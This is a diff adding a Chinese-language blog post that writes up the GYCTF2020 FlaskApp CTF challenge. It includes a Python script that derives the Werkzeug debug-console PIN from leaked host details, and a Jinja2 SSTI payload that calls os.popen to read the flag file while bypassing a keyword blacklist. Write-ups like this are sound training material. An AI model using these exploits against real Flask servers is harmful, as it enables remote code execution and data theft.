@@ -1,0 +1,222 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GYCTF2020FlaskApp - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="知识点
+Flask DEbug模式
+SSTI
+
+预期
+复现的，主要是需要利用SSTI获取如下信息：
+
+ cat /etc/passwd 下的当前用户名
+
+modname 一般默认为flask.app,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">GYCTF2020FlaskApp</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">GYCTF2020FlaskApp</h1>
+        <div class="stuff">
+            <span>五月 13, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Python/" rel="tag">Python</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
+<li>Flask DEbug模式</li>
+<li>SSTI</li>
+</ul>
+<h1 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h1><p><img src="GYCTF2020FlaskApp/image-20210513224517992.png" alt="image-20210513224517992"></p>
+<p>复现的，主要是需要利用SSTI获取如下信息：</p>
+<ul>
+<li><p> cat /etc/passwd 下的当前用户名</p>
+</li>
+<li><p>modname 一般默认为flask.app</p>
+</li>
+<li><pre><code class="python">getattr(app, “__name__”, app.__class__.__name__)。python该值一般为Flask 值一般不变
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ flask库下面的app.py 的绝对路径，一般报错信息就泄露了</span><br><span class="line"></span><br><span class="line">+ 当前网络的mac地址的十进制，读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 即可得到</span><br><span class="line"></span><br><span class="line">  利用python转换成十进制</span><br><span class="line"></span><br><span class="line">  ![image-20210513224832045](GYCTF2020FlaskApp&#x2F;image-20210513224832045.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">机器的ID： 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。</span><br><span class="line"></span><br><span class="line">对于docker机则读取读取&#x2F;proc&#x2F;self&#x2F;cgroup获取get_machine_id()(docker后面那段字符串)：</span><br><span class="line"></span><br><span class="line">EXP,抓过来，打</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits &#x3D; [</span><br><span class="line">    &#39;flaskweb&#39;# username</span><br><span class="line">    &#39;flask.app&#39;,# modname</span><br><span class="line">    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span><br><span class="line">    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits &#x3D; [</span><br><span class="line">    &#39;2485377871076&#39;,# str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</span><br><span class="line">    &#39;bad1f6f0683c071acc834769dff047e264024e2f37e2cb6fb1e77c550c4eb15a&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h &#x3D; hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit &#x3D; bit.encode(&#39;utf-8&#39;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#39;cookiesalt&#39;)</span><br><span class="line"></span><br><span class="line">cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num &#x3D; None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#39;pinsalt&#39;)</span><br><span class="line">    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv &#x3D;None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size &#x3D;&#x3D; 0:</span><br><span class="line">            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv &#x3D; num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+</code></pre>
+</li>
+</ul>
+<h1 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h1><p>我自己做的时候我是直接非预期了，作者的过滤不是很严格导致我直接绕过了</p>
+<h2 id="ssti-挨个整过去"><a href="#ssti-挨个整过去" class="headerlink" title="ssti 挨个整过去"></a>ssti 挨个整过去</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;po&#39;+&#39;pen&#39;](&#39;cat &#x2F;this_is_the_fl[a&#123;1&#125;]g.txt&#39;).read()&#125;&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>题目是过滤了如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span> black_list = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;chr&quot;</span>, <span class="string">&quot;request&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;commands&quot;</span>, <span class="string">&quot;socket&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>过滤了? 和 * 号但是没有过滤中括号，要知道，在linux当中是允许使用正则表达式读取文件的,利用这个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;songgj&#x2F;p&#x2F;8906005.html</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F"><span class="toc-number">2.</span> <span class="toc-text">预期</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">3.</span> <span class="toc-text">非预期</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti-%E6%8C%A8%E4%B8%AA%E6%95%B4%E8%BF%87%E5%8E%BB"><span class="toc-number">3.1.</span> <span class="toc-text">ssti 挨个整过去</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
